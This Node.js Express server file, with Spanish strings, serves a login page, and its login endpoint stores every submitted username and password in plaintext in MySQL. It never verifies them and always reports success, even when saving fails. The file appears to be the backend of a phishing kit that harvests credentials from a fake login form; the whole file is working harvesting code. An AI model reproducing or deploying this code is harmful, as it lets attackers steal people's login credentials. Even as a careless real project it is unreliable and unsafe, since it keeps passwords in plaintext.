require('dotenv').config();
const express = require('express');
const cors    = require('cors');
const path    = require('path');
const db      = require('./db');

const app  = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'login.html'));
});

app.post('/api/login', async (req, res) => {
  const { usuario, password } = req.body;
  if (!usuario || !password) {
    return res.status(400).json({ error: 'Completa todos los campos' });
  }
  try {
    await db.query(
      'INSERT INTO usuarios (usuario, password) VALUES (?, ?)',
      [usuario, password]
    );
    res.json({ ok: true });
  } catch (err) {
    console.error('Error guardando:', err.message);
    res.json({ ok: true });
  }
});

app.listen(PORT, () => {
  console.log(`🚀  Servidor corriendo en http://localhost:${PORT}`);
  console.log(`✅  Guardando credenciales en MySQL`);
});
